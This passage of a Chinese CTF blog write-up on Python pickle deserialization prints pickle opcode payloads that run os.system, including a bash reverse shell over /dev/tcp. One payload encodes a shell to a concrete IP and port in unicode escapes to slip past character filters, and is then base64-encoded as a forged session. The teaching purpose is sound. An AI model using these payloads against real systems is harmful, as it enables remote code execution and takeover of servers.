+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b'''(cos</span><br><span class="line">system</span><br><span class="line">S'whoami'</span><br><span class="line">o.''</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是这题禁用了o并且没有文件读取，需要反弹shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">opcode = b"""(cos</span><br><span class="line">system</span><br><span class="line">S'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'</span><br><span class="line">o.</span><br><span class="line">"""</span><br></pre></td></tr></tbody></table></figure>
+
+<p>禁用了o可以用os去凑一下，但是反弹shell时会将i禁用，这时候我们就需要使用操作符V</p>
+<p>使用os的话要遵循s操作符的用法所以要构造</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b"""(S'key'</span><br><span class="line">S'val'</span><br><span class="line">dS'v'</span><br><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">V\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0038\u002e\u0031\u0034\u0030\u002e\u0032\u0033\u0036\u002e\u0031\u0033\u0037\u002f\u0039\u0039\u0039\u0039\u0020\u0030\u003e\u0026\u0031</span><br><span class="line">os.</span><br><span class="line">"""</span><br><span class="line">{'user': 'admin','ser_data': 'KFMna2V5JwpTJ3ZhbCcKZFMndicKKGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzOFx1MDAyZVx1MDAzMVx1MDAzNFx1MDAzMFx1MDAyZVx1MDAzMlx1MDAzM1x1MDAzNlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzN1x1MDAyZlx1MDAzOVx1MDAzOVx1MDAzOVx1MDAzOVx1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMQpvcy4K'}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>伪造session</p>
+<p>然后弹shell得到flag（我是没弹到，但是思路应该没问题）</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/2d71dd35/">https://lxu2n.github.io/posts/2d71dd35/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/96409491/" title="shiro550"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">shiro550</div></div><div class="info-2"><div class="info-item-1">前言shiro550的根本原因是因为使用固定的key进行加密 环境搭建jdk8u65（我们当时调cc链的时候已经准备好了） Tomcat8 https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/  下载好之后解压缩，然后进入bin点击startup.bat，如果一闪而过，那就用在命令行中去运行它，看看缺什么环境变量（一般是）然后添加这个环境变量就行了。  最后运行在本地的8080端口  shiro1.2.4  漏洞影响的版本：shiro&lt;=1.2.4 靶场环境搭建 我们先下载p神的项目  https://github.com/phith0n/JavaThings/tree/master/shirodemo  使用idea打开项目   在这里添加我们刚刚下载好的tomcat  在进入项目结构中添加工件    最后设置运行与调试    点击login.jsp运行，配置好路由是这个界面  至此环境搭配完成 shiro550分析由于 Shiro 使用的 RememberMe 功能通过 AES 加密的 Coo...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">2.1.</span> <span class="toc-text">进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8opcode%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">使用opcode绕过过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84payload"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">一些命令执行的payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8%E4%BD%BF%E7%94%A8opcode%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">3.1.</span> <span class="toc-text">不用使用opcode的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HFCTF-2021-Final-easyflask"><span class="toc-number">3.1.1.</span> <span class="toc-text">[HFCTF 2021 Final]easyflask</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HZNUCTF-2023-preliminary-pickle"><span class="toc-number">3.1.2.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]pickle</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8opcode%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">3.2.</span> <span class="toc-text">使用opcode的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MTCTF-2022-easypickle"><span class="toc-number">3.2.1.</span> <span class="toc-text">[MTCTF 2022]easypickle</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2d71dd35/" title="pickle反序列化">pickle反序列化</a><time datetime="2025-11-25T06:59:28.000Z" title="发表于 2025-11-25 14:59:28">2025-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/96409491/" title="shiro550">shiro550</a><time datetime="2025-11-19T13:55:06.000Z" title="发表于 2025-11-19 21:55:06">2025-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/be271daf/" title="initial">initial</a><time datetime="2025-11-13T11:56:33.000Z" title="发表于 2025-11-13 19:56:33">2025-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b320f10d/" title="udf提权">udf提权</a><time datetime="2025-11-13T07:04:30.000Z" title="发表于 2025-11-13 15:04:30">2025-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b5e7950d/" title="NSSCTF秋季新生赛">NSSCTF秋季新生赛</a><time datetime="2025-11-12T06:42:59.000Z" title="发表于 2025-11-12 14:42:59">2025-11-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
